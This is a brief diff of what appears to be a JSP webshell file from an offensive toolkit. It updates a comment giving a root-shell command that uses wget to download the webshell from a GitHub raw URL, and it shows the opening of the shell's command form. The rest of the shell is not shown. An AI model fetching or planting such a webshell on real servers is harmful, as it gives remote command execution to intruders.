@@ -1,5 +1,5 @@
 # JSP webshell
-# root@kali:~# nano -w index.jsp  OR wget 'http://raw.github.com/MiniLini/fishstick/index.jsp' - this 
+# root@kali:~# nano -w index.jsp  OR wget 'https://raw.githubusercontent.com/MiniLini/fishstick/main/index.jsp'
 
 
 <FORM METHOD=GET ACTION='index.jsp'>
